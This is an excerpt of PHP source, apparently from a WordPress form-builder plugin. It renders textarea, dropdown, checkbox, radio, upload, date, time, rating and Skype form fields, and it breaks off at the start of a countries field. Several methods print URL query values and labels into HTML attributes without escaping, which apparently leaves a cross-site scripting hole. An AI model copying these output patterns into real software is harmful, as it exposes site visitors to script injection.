    public static function textarea( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $result  = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        
        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }

        // @since   1.0.6    - make sure this data is set
        if( ( !isset( $atts['value'] ) ) || ( $atts['value']=='' ) ) {
            $atts['value'] = '';
        }else{
            $atts['value'] = SUPER_Common::email_tags( $atts['value'] );
        }

        // @since   1.2.4
        if( !isset( $atts['editor'] ) ) $atts['editor'] = 'false';
        if( !isset( $atts['media_buttons'] ) ) $atts['media_buttons'] = 'true';
        if( !isset( $atts['wpautop'] ) ) $atts['wpautop'] = 'true';
        if( !isset( $atts['force_br'] ) ) $atts['force_br'] = 'false';
        if( !isset( $atts['editor_height'] ) ) $atts['editor_height'] = 100;
        if( !isset( $atts['teeny'] ) ) $atts['teeny'] = 'false';
        if( !isset( $atts['quicktags'] ) ) $atts['quicktags'] = 'true';
        if( !isset( $atts['drag_drop_upload'] ) ) $atts['drag_drop_upload'] = 'true';

        if( $atts['editor']=='true' ) {
            
            if( SUPER_Forms()->is_request('ajax') ) {
                global $wp_scripts, $wp_styles, $wp_version, $tinymce_version, $concatenate_scripts, $compress_scripts;
                $version = 'ver=' . $wp_version;
                $suffix = SCRIPT_DEBUG ? '' : '';
                $abspath_inc = ABSPATH . WPINC;
                $includes_url = includes_url();
                $admin_url = admin_url();
                $style_content = '';
                $array = array(
                    'buttons' => 'buttons',
                    'editor' => 'editor',
                    'editor-buttons' => 'editor-buttons',
                    'media-views' => 'media-views',
                    'dashicons' => 'dashicons'
                );
                foreach( $array as $k => $v ) {
                    if ( file_exists( "{$abspath_inc}/css/$v{$suffix}.css" ) ) {
                        if( !in_array( $k, $wp_styles->queue ) ) $style_content .= wp_remote_fopen("{$includes_url}css/$v{$suffix}.css");
                    }
                }
                $result .= '<style type="text/css">' . $style_content . '</style>';

                ob_start();
                ?>
                <script type="text/javascript">
                /* <![CDATA[ */
                var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction","dfw":"Distraction-free writing mode","strong":"Bold","strongClose":"Close bold tag","em":"Italic","emClose":"Close italic tag","link":"Insert link","blockquote":"Blockquote","blockquoteClose":"Close blockquote tag","del":"Deleted text (strikethrough)","delClose":"Close deleted text tag","ins":"Inserted text","insClose":"Close inserted text tag","image":"Insert image","ul":"Bulleted list","ulClose":"Close bulleted list tag","ol":"Numbered list","olClose":"Close numbered list tag","li":"List item","liClose":"Close list item tag","code":"Code","codeClose":"Close code tag","more":"Insert Read More tag"};
                /* ]]> */
                </script>
                <?php
                $result .= ob_get_clean();

                $array = array(
                    'quicktags' => 'quicktags'
                    //'media-audiovideo' => 'media-audiovideo',
                    //'media-editor' => 'media-editor',
                    //'media-models' => 'media-models',
                    //'media-views' => 'media-views',
                    //'shortcode' => 'shortcode',
                    //'underscore' => 'underscore',
                    //'utils' => 'utils',
                    //'wp-a11y' => 'wp-a11y',
                    //'wp-backbone' => 'wp-backbone',
                    //'wp-util' => 'wp-util',
                    //'wplink' => 'wplink',
                    //'wp-embed' => 'wp-embed',
                    //'wp-emoji-release' => 'wp-emoji-release'
                );
                foreach( $array as $k => $v ) {
                    if ( file_exists( "{$abspath_inc}/js/$v{$suffix}.js" ) ) {
                        if( !in_array( $k, $wp_scripts->queue ) ) $result .= "<script type='text/javascript' src='{$includes_url}js/$v{$suffix}.js?$version'></script>";
                    }
                }
                $baseurl = includes_url();
                $baseurl_tinymce = includes_url( 'js/tinymce' );
                $mce_suffix = false !== strpos( $wp_version, '-src' ) ? '' : '.min';
                $suffix = SCRIPT_DEBUG ? '' : '';
                $compressed = $compress_scripts && $concatenate_scripts && isset($_SERVER['HTTP_ACCEPT_ENCODING'])
                    && false !== stripos($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip');
                if ( $compressed ) {
                    $result .= "<script type='text/javascript' src='{$baseurl_tinymce}/wp-tinymce.php?c=1&amp;$version'></script>\n";
                    $result .= "<script type='text/javascript' src='{$baseurl}js/utils{$suffix}.js?$version'></script>\n";
                } else {
                    $result .= "<script type='text/javascript' src='{$baseurl_tinymce}/tinymce{$mce_suffix}.js?$version'></script>\n";
                    $result .= "<script type='text/javascript' src='{$baseurl_tinymce}/plugins/compat3x/plugin{$suffix}.js?$version'></script>\n";
                    $result .= "<script type='text/javascript' src='{$baseurl}js/utils{$suffix}.js?$version'></script>\n";
                }
                $abspath_inc = ABSPATH . 'wp-admin';
                $array = array(
                    'editor' => 'editor',
                    'media-upload' => 'media-upload'
                );
                foreach( $array as $k => $v ) {
                    if ( file_exists( "{$abspath_inc}/js/$v{$suffix}.js" ) ) {
                        if( !in_array( $k, $wp_scripts->queue ) ) $result .= "<script type='text/javascript' src='{$admin_url}js/$v{$suffix}.js?$version'></script>";
                    }
                }


                $atts['tinymce'] = true;
                if( $atts['force_br']=='true' ) {
                    $atts['tinymce'] = array(
                        'forced_root_block' => false,
                        'force_br_newlines' => true,
                        'force_p_newlines' => false,
                        'convert_newlines_to_brs' => true,
                    );
                }
                $editor_settings = array(
                    'editor_class' => 'super-shortcode-field',
                    'textarea_name' => $atts['name'],
                    'media_buttons' => filter_var( $atts['media_buttons'], FILTER_VALIDATE_BOOLEAN ),
                    'wpautop' => filter_var( $atts['wpautop'], FILTER_VALIDATE_BOOLEAN ),
                    'editor_height' => $atts['editor_height'],
                    'teeny' => filter_var( $atts['teeny'], FILTER_VALIDATE_BOOLEAN ),
                    'tinymce' => $atts['tinymce'],
                    'quicktags' => filter_var( $atts['quicktags'], FILTER_VALIDATE_BOOLEAN ),
                    'drag_drop_upload' => filter_var( $atts['drag_drop_upload'], FILTER_VALIDATE_BOOLEAN )
                );
                ob_start();
                wp_editor( $atts['value'], $atts['name'] . '-' . absint($settings['id']), $editor_settings );
                $editor_html = ob_get_clean();
                $common_attributes = self::common_attributes( $atts, $tag );
                $editor_html = str_replace( '></textarea>', $common_attributes . ' data-force-br="' . $atts['force_br'] . '" data-teeny="' . $atts['teeny'] . '" data-incl-url="' . $includes_url . '"></textarea>', $editor_html );
                $editor_html = str_replace( '<textarea', '<textarea id="' . $atts['name'] . '-' . absint($settings['id']) . '"', $editor_html );
                $result .= str_replace( 'super-shortcode-field', 'super-shortcode-field super-text-editor', $editor_html );
            }else{
                $atts['tinymce'] = true;
                if( $atts['force_br']=='true' ) {
                    $atts['tinymce'] = array(
                        'forced_root_block' => false,
                        'force_br_newlines' => true,
                        'force_p_newlines' => false,
                        'convert_newlines_to_brs' => true,
                    );
                }
                $editor_settings = array(
                    'editor_class' => 'super-shortcode-field',
                    'textarea_name' => $atts['name'],
                    'media_buttons' => filter_var( $atts['media_buttons'], FILTER_VALIDATE_BOOLEAN ),
                    'wpautop' => filter_var( $atts['wpautop'], FILTER_VALIDATE_BOOLEAN ),
                    'editor_height' => $atts['editor_height'],
                    'teeny' => filter_var( $atts['teeny'], FILTER_VALIDATE_BOOLEAN ),
                    'tinymce' => $atts['tinymce'],
                    'quicktags' => filter_var( $atts['quicktags'], FILTER_VALIDATE_BOOLEAN ),
                    'drag_drop_upload' => filter_var( $atts['drag_drop_upload'], FILTER_VALIDATE_BOOLEAN )
                );
                ob_start();
                wp_editor( $atts['value'], $atts['name'] . '-' . absint($settings['id']), $editor_settings );
                $editor_html = ob_get_clean();
                $common_attributes = self::common_attributes( $atts, $tag );
                $editor_html = str_replace( '<textarea','<textarea '.$common_attributes.' ', $editor_html );
                $editor_html = str_replace( '<textarea', '<textarea id="' . $atts['name'] . '-' . absint($settings['id']) . '"', $editor_html );
                $result .= str_replace( 'super-shortcode-field', 'super-shortcode-field super-text-editor initialized', $editor_html );
            }
        }else{
            $result .= '<textarea class="super-shortcode-field"';
            $result .= ' name="' . $atts['name'] . '"';
            $result .= self::common_attributes( $atts, $tag );
            $result .= ' />' . $atts['value'] . '</textarea>';
        }

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function dropdown( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        
        $multiple = '';
        if( !isset( $atts['maxlength'] ) ) $atts['maxlength'] = 0;
        if( !isset( $atts['minlength'] ) ) $atts['minlength'] = 0;
        if( ($atts['minlength']>1) || ($atts['maxlength']>1) ) $multiple = ' multiple';

        $items = array();
        $placeholder = '';
        
        // @since   1.0.6
        if( !isset( $atts['retrieve_method'] ) ) $atts['retrieve_method'] = 'custom';
        if($atts['retrieve_method']=='custom') {
            $selected_items = array();
            foreach( $atts['dropdown_items'] as $k => $v ) {
                if( $v['checked']=='true' ) {
                    $selected_items[] = $v['value'];
                    if( $placeholder=='' ) {
                        $placeholder .= $v['label'];
                    }else{
                        $placeholder .= ', ' . $v['label'];
                    }
                    $items[] = '<li data-value="' . esc_attr( $v['value'] ) . '" class="selected">' . $v['label'] . '</li>'; 
                }else{
                    $items[] = '<li data-value="' . esc_attr( $v['value'] ) . '">' . $v['label'] . '</li>'; 
                }
            }
            foreach($selected_items as $k => $value){
                if($k==0){
                    $atts['value'] = $value;
                }else{
                    $atts['value'] .= ','.$value;
                }
            }
        }      

        // @since   1.0.6
        if($atts['retrieve_method']=='taxonomy') {
            if( !isset( $atts['retrieve_method_taxonomy'] ) ) $atts['retrieve_method_taxonomy'] = 'category';
            if( !isset( $atts['retrieve_method_exclude_taxonomy'] ) ) $atts['retrieve_method_exclude_taxonomy'] = '';
            if( !isset( $atts['retrieve_method_hide_empty'] ) ) $atts['retrieve_method_hide_empty'] = 0;
            if( !isset( $atts['retrieve_method_parent'] ) ) $atts['retrieve_method_parent'] = '';
            
            $args = array(
                'hide_empty' => $atts['retrieve_method_hide_empty'],
                'exclude' => $atts['retrieve_method_exclude_taxonomy'],
                'taxonomy' => $atts['retrieve_method_taxonomy'],
                'parent' => $atts['retrieve_method_parent'],
            );
            $categories = get_categories( $args );
            foreach( $categories as $v ) {
                // @since 1.2.5
                if( !isset( $atts['retrieve_method_value'] ) ) $atts['retrieve_method_value'] = 'slug';
                if($atts['retrieve_method_value']=='slug'){
                    $data_value = $v->slug;
                }elseif($atts['retrieve_method_value']=='id'){
                    $data_value = $v->term_id;
                }else{
                    $data_value = $v->name;
                }
                $items[] = '<li data-value="' . esc_attr( $data_value ) . '">' . $v->name . '</li>'; 
            }
        }

        // @since   1.2.4
        if($atts['retrieve_method']=='post_type') {
            if( !isset( $atts['retrieve_method_post'] ) ) $atts['retrieve_method_post'] = 'post';
            if( !isset( $atts['retrieve_method_exclude_post'] ) ) $atts['retrieve_method_exclude_post'] = '';
            if( !isset( $atts['retrieve_method_parent'] ) ) $atts['retrieve_method_parent'] = '';
            $args = array(
                'post_type' => $atts['retrieve_method_post'],
                'exclude' => $atts['retrieve_method_exclude_post'],
                'post_parent' => $atts['retrieve_method_parent'],
                'posts_per_page'=>-1, 
                'numberposts'=>-1
            );
            $posts = get_posts( $args );
            foreach( $posts as $v ) {
                
                // @since 1.2.5
                if( !isset( $atts['retrieve_method_value'] ) ) $atts['retrieve_method_value'] = 'slug';
                if($atts['retrieve_method_value']=='slug'){
                    $data_value = $v->post_name;
                }elseif($atts['retrieve_method_value']=='id'){
                    $data_value = $v->ID;
                }else{
                    $data_value = $v->post_title;
                }
                $items[] = '<li data-value="' . esc_attr($data_value) . '">' . $v->post_title . '</li>'; 
            }
        }

        // @since   1.0.6
        if($atts['retrieve_method']=='csv') {
            
            // @since   1.2.5
            $delimiter = ',';
            $enclosure = '"';
            if( isset( $atts['retrieve_method_delimiter'] ) ) $delimiter = $atts['retrieve_method_delimiter'];
            if( isset( $atts['retrieve_method_enclosure'] ) ) $enclosure = stripslashes($atts['retrieve_method_enclosure']);

            $file = get_attached_file($atts['retrieve_method_csv']);
            if( $file ) {
                $row = 1;
                if (($handle = fopen($file, "r")) !== FALSE) {
                    while (($data = fgetcsv($handle, 1000, $delimiter, $enclosure)) !== FALSE) {
                        $num = count($data);
                        $row++;
                        $value = 'undefined';
                        $title = 'undefined';
                        for ( $c=0; $c < $num; $c++ ) {
                            if( $c==0) $value = $data[$c];
                            if( $c==1 ) $title = $data[$c];

                        }
                        if( $title=='undefined' ) {
                            $title = $value; 
                        }
                        $items[] = '<li data-value="' . esc_attr( $value ) . '">' . $title . '</li>';
                    }
                    fclose($handle);
                }
            }
        }

        if( $placeholder!='' ) {
            $atts['placeholder'] = $placeholder;
        }
        if( empty( $atts['placeholder'] ) ) {
            $atts['placeholder'] = $atts['dropdown_items'][0]['label'];
            $atts['value'] = $atts['dropdown_items'][0]['value'];
            $atts['dropdown_items'][0]['checked'] = true;
            $items[0] = '<li data-value="' . esc_attr( $atts['value'] ) . '" class="selected">' . $atts['placeholder'] . '</li>'; 
        }
        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        $result .= '<input class="super-shortcode-field" type="hidden"';
        if( !isset( $atts['value'] ) ) $atts['value'] = '';
        $result .= ' value="' . $atts['value'] . '" name="' . $atts['name'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '<ul class="super-dropdown-ui' . $multiple . '">';
        $result .= '<li data-value="" class="super-placeholder">' . $atts['placeholder'] . '</li>';
        foreach( $items as $v ) {
            $result .= $v;
        }
        $result .= '</ul>';
        $result .= '<span class="super-dropdown-arrow"></span>';
        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;    
    }
    public static function dropdown_items( $tag, $atts ) {
        return '<li data-value="' . esc_attr( $atts['value'] ) . '">' . $atts['label'] . '</li>'; 
    }
    public static function checkbox( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $classes = ' display-' . $atts['display'];
        $result = self::opening_tag( $tag, $atts, $classes );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        $checked_items = array();
        $items = array();
        
        // @since   1.2.7
        if( !isset( $atts['retrieve_method'] ) ) $atts['retrieve_method'] = 'custom';
        if($atts['retrieve_method']=='custom') {
            foreach( $atts['checkbox_items'] as $k => $v ) {
                if( ($v['checked']=='true') ) $checked_items[] = $v['value'];
                if( !isset( $v['image'] ) ) $v['image'] = '';
                if( $v['image']!='' ) {
                    $image = wp_get_attachment_image_src( $v['image'] );
                    $image = !empty( $image[0] ) ? $image[0] : '';
                    $item = '';
                    $item .= '<label' . ( (($v['checked']==='false') || ($v['checked']===false)) ? ' class="super-has-image"' : ' class="super-has-image super-selected"' ) . '>';
                    if( !empty( $image ) ) {
                        $item .= '<div class="image" style="background-image:url(\'' . $image . '\');"><img src="' . $image . '"></div>';
                    }else{
                        $image = SUPER_PLUGIN_FILE . 'assets/images/image-icon.png';
                        $item .= '<div class="image" style="background-image:url(\'' . $image . '\');"><img src="' . $image . '"></div>';
                    }
                    $item .= '<input ' . ( (($v['checked']==='false') || ($v['checked']===false)) ? '' : 'checked="checked"' ) . ' type="checkbox" value="' . esc_attr( $v['value'] ) . '" />';
                    $item .= $v['label'];
                    $item .='</label>';
                }else{
                    $item = '<label' . ( (($v['checked']==='false') || ($v['checked']===false)) ? '' : ' class="super-selected"' ) . '><input ' . ( (($v['checked']==='false') || ($v['checked']===false)) ? '' : 'checked="checked"' ) . ' type="checkbox" value="' . esc_attr( $v['value'] ) . '" />' . $v['label'] . '</label>';
                }
                $items[] = $item;
            }
            foreach($checked_items as $k => $value){
                if($k==0){
                    $atts['value'] = $value;
                }else{
                    $atts['value'] .= ','.$value;
                }
            }
        }      

        // @since   1.2.7
        if($atts['retrieve_method']=='taxonomy') {
            if( !isset( $atts['retrieve_method_taxonomy'] ) ) $atts['retrieve_method_taxonomy'] = 'category';
            if( !isset( $atts['retrieve_method_exclude_taxonomy'] ) ) $atts['retrieve_method_exclude_taxonomy'] = '';
            if( !isset( $atts['retrieve_method_hide_empty'] ) ) $atts['retrieve_method_hide_empty'] = 0;
            if( !isset( $atts['retrieve_method_parent'] ) ) $atts['retrieve_method_parent'] = '';
            $args = array(
                'hide_empty' => $atts['retrieve_method_hide_empty'],
                'exclude' => $atts['retrieve_method_exclude_taxonomy'],
                'taxonomy' => $atts['retrieve_method_taxonomy'],
                'parent' => $atts['retrieve_method_parent'],
            );
            $categories = get_categories( $args );
            foreach( $categories as $v ) {
                if( !isset( $atts['retrieve_method_value'] ) ) $atts['retrieve_method_value'] = 'slug';
                if($atts['retrieve_method_value']=='slug'){
                    $data_value = $v->slug;
                }elseif($atts['retrieve_method_value']=='id'){
                    $data_value = $v->term_id;
                }else{
                    $data_value = $v->name;
                }
                $items[] = '<label><input type="checkbox" value="' . esc_attr( $data_value ) . '" />' . $v->name . '</label>';
            }
        }

        // @since   1.2.7
        if($atts['retrieve_method']=='post_type') {
            if( !isset( $atts['retrieve_method_post'] ) ) $atts['retrieve_method_post'] = 'post';
            if( !isset( $atts['retrieve_method_exclude_post'] ) ) $atts['retrieve_method_exclude_post'] = '';
            if( !isset( $atts['retrieve_method_parent'] ) ) $atts['retrieve_method_parent'] = '';
            $args = array(
                'post_type' => $atts['retrieve_method_post'],
                'exclude' => $atts['retrieve_method_exclude_post'],
                'post_parent' => $atts['retrieve_method_parent'],
                'posts_per_page'=>-1, 
                'numberposts'=>-1
            );
            $posts = get_posts( $args );
            foreach( $posts as $v ) {
                if( !isset( $atts['retrieve_method_value'] ) ) $atts['retrieve_method_value'] = 'slug';
                if($atts['retrieve_method_value']=='slug'){
                    $data_value = $v->post_name;
                }elseif($atts['retrieve_method_value']=='id'){
                    $data_value = $v->ID;
                }else{
                    $data_value = $v->post_title;
                }
                $items[] = '<label><input type="checkbox" value="' . esc_attr( $data_value ) . '" />' . $v->post_title . '</label>';
            }
        }

        // @since   1.2.7
        if($atts['retrieve_method']=='csv') {
            $delimiter = ',';
            $enclosure = '"';
            if( isset( $atts['retrieve_method_delimiter'] ) ) $delimiter = $atts['retrieve_method_delimiter'];
            if( isset( $atts['retrieve_method_enclosure'] ) ) $enclosure = stripslashes($atts['retrieve_method_enclosure']);
            $file = get_attached_file($atts['retrieve_method_csv']);
            if( $file ) {
                $row = 1;
                if (($handle = fopen($file, "r")) !== FALSE) {
                    while (($data = fgetcsv($handle, 1000, $delimiter, $enclosure)) !== FALSE) {
                        $num = count($data);
                        $row++;
                        $value = 'undefined';
                        $title = 'undefined';
                        for ( $c=0; $c < $num; $c++ ) {
                            if( $c==0) $value = $data[$c];
                            if( $c==1 ) $title = $data[$c];

                        }
                        if( $title=='undefined' ) {
                            $title = $value; 
                        }
                        $items[] = '<label><input type="checkbox" value="' . esc_attr( $value ) . '" />' . $title . '</label>';
                    }
                    fclose($handle);
                }
            }
        }
        foreach( $items as $v ) {
            $result .= $v;
        }

        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        $result .= '<input class="super-shortcode-field" type="hidden"';
        $result .= ' name="' . esc_attr( $atts['name'] ) . '" value="' . $atts['value'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function radio( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $classes = ' display-' . $atts['display'];
        $result = self::opening_tag( $tag, $atts, $classes );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        foreach( $atts['radio_items'] as $k => $v ) {
            if( $v['checked']=='true' ) $atts['value'] = $v['value'];
            
            // @since   1.2.3
            if( !isset( $v['image'] ) ) $v['image'] = '';
            if( $v['image']!='' ) {
                $image = wp_get_attachment_image_src( $v['image'] );
                $image = !empty( $image[0] ) ? $image[0] : '';
                $result .= '<label' . ( (($v['checked']==='false') || ($v['checked']===false)) ? ' class="super-has-image"' : ' class="super-has-image super-selected"' ) . '>';
                if( !empty( $image ) ) {
                    $result .= '<div class="image" style="background-image:url(\'' . $image . '\');"><img src="' . $image . '"></div>';
                }else{
                    $image = SUPER_PLUGIN_FILE . 'assets/images/image-icon.png';
                    $result .= '<div class="image" style="background-image:url(\'' . $image . '\');"><img src="' . $image . '"></div>';
                }
                $result .= '<input ' . ( (($v['checked']==='false') || ($v['checked']===false)) ? '' : 'checked="checked"' ) . ' type="radio" value="' . esc_attr( $v['value'] ) . '" />';
                $result .= $v['label'];
                $result .='</label>';

            }else{
                $result .= '<label' . ( (($v['checked']==='false') || ($v['checked']===false)) ? '' : ' class="super-selected"' ) . '><input ' . ( (($v['checked']==='false') || ($v['checked']===false)) ? '' : 'checked="checked"' ) . ' type="radio" value="' . esc_attr( $v['value'] ) . '" />' . $v['label'] . '</label>';
            }
        }
        
        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        $result .= '<input class="super-shortcode-field" type="hidden"';
        $result .= ' name="' . esc_attr( $atts['name'] ) . '" value="' . $atts['value'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function radio_items( $tag, $atts ) {
        return '<label><input ' . ( (($atts['checked']==='false') || ($atts['checked']===false)) ? '' : 'checked="checked"' ) . ' type="radio" value="' . esc_attr( $atts['value'] ) . '" />' . $atts['label'] . '</label>';
    }
    public static function file( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $dir = SUPER_PLUGIN_FILE . 'assets/js/frontend/jquery-file-upload/';
        wp_enqueue_script( 'jquery-ui-widget' );
        wp_enqueue_script( 'super-upload-iframe-transport', $dir . 'jquery.iframe-transport.js', array( 'jquery' ), SUPER_VERSION, false );
        wp_enqueue_script( 'super-upload-fileupload', $dir . 'jquery.fileupload.js', array( 'jquery' ), SUPER_VERSION, false );
        wp_enqueue_script( 'super-upload-fileupload-process', $dir . 'jquery.fileupload-process.js', array( 'jquery' ), SUPER_VERSION, false );
        wp_enqueue_script( 'super-upload-fileupload-validate', $dir . 'jquery.fileupload-validate.js', array( 'jquery' ), SUPER_VERSION, false );
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        $result .= '<div class="super-fileupload-button"';
        $style = '';
        if( !isset( $atts['extensions'] ) ) $atts['extensions'] = 'jpg|jpeg|png|gif|pdf';
        if( !isset( $atts['width'] ) ) $atts['width'] = 0;
        if( $atts['width']!=0 ) $style .= 'width:' . $atts['width'] . 'px;';
        if( !empty( $styles ) ) $style .= $styles;
        if( !empty( $style ) ) $result .= ' style="'.$style.'"';
        $result .= '><i class="fa fa-plus"></i><span class="super-fileupload-button-text">' . $atts['placeholder'] . '</span></div>';
        $atts['placeholder'] = '';
        $result .= '<input class="super-shortcode-field super-fileupload" type="file" name="files[]" data-file-size="' . $atts['filesize'] . '" data-accept-file-types="' . $atts['extensions'] . '" data-url="' . SUPER_PLUGIN_FILE . 'uploads/php/"';
        if( !isset( $atts['maxlength'] ) ) $atts['maxlength'] = 0;
        if( !isset( $atts['minlength'] ) ) $atts['minlength'] = 0;
        if( ($atts['minlength']>1) || ($atts['maxlength']>1) ) $result .= ' multiple';
        $result .= ' />';
        $result .= '<input class="super-selected-files" type="hidden"';
        $result .= ' value="" name="' . $atts['name'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';
        $result .= '<div class="super-progress-bar"></div>';
        $result .= '<div class="super-fileupload-files"></div>';
        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function date( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        wp_enqueue_script( 'jquery-ui-datepicker', false, array( 'jquery' ), SUPER_VERSION );
        wp_enqueue_script( 'super-date-format', SUPER_PLUGIN_FILE . 'assets/js/frontend/date-format.min.js' );
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        $result .= '<input class="super-shortcode-field super-datepicker" type="text" autocomplete="off" ';
        $format = $atts['format'];
        if( $format=='custom' ) $format = $atts['custom_format'];

        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }

        // @since 1.1.8 - added option to select an other datepicker to achieve date range with 2 datepickers (useful for booking forms)
        if( !isset( $atts['connected_min'] ) ) $atts['connected_min'] = '';
        if( !isset( $atts['connected_max'] ) ) $atts['connected_max'] = '';

        // @since 1.2.5 - added option to add or deduct days based on connected datepicker
        if( !isset( $atts['connected_min_days'] ) ) $atts['connected_min_days'] = '1';
        if( !isset( $atts['connected_max_days'] ) ) $atts['connected_max_days'] = '1';

        if( !isset( $atts['range'] ) ) $atts['range'] = '-100:+5';
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        $result .= ' value="' . $atts['value'] . '" name="' . $atts['name'] . '" data-format="' . $format . '" data-connected_min="' . $atts['connected_min'] . '" data-connected_min_days="' . $atts['connected_min_days'] . '" data-connected_max="' . $atts['connected_max'] . '" data-connected_max_days="' . $atts['connected_max_days'] . '" data-range="' . $atts['range'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function time( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        wp_enqueue_script( 'jquery-timepicker', SUPER_PLUGIN_FILE . 'assets/js/frontend/timepicker.min.js' );
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );

        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        $result .= '<input class="super-shortcode-field super-timepicker" type="text" autocomplete="off" ';
        if( !isset( $atts['range'] ) ) $atts['range'] = '';
        $result .= ' value="' . $atts['value'] . '" name="' . $atts['name'] . '" data-format="' . $atts['format'] . '" data-step="' . $atts['step'] . '" data-range="' . $atts['range'] . '" data-duration="' . $atts['duration'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }    
    public static function rating( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        $result .= '<div class="super-rating">';
        $result .= '<i class="fa fa-star super-rating-star"></i>';
        $result .= '<i class="fa fa-star super-rating-star"></i>';
        $result .= '<i class="fa fa-star super-rating-star"></i>';
        $result .= '<i class="fa fa-star super-rating-star"></i>';
        $result .= '<i class="fa fa-star super-rating-star"></i>';
        
        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        $result .= '<input class="super-shortcode-field super-star-rating" type="hidden"';
        $result .= ' value="' . $atts['value'] . '" name="' . $atts['name'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function skype( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        wp_enqueue_script( 'super-skype', 'http://www.skypeassets.com/i/scom/js/skype-uri.js' );
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        if( !isset( $atts['username'] ) ) $atts['username'] = '';
        $result .= '<div id="SkypeButton_Call_' . $atts['username'] . '" class="super-skype-button" data-username="' . $atts['username'] . '" data-method="' . $atts['method'] . '" data-color="' . $atts['color'] . '" data-size="' . $atts['size'] . '"></div>';
        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function countries( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        $multiple = '';
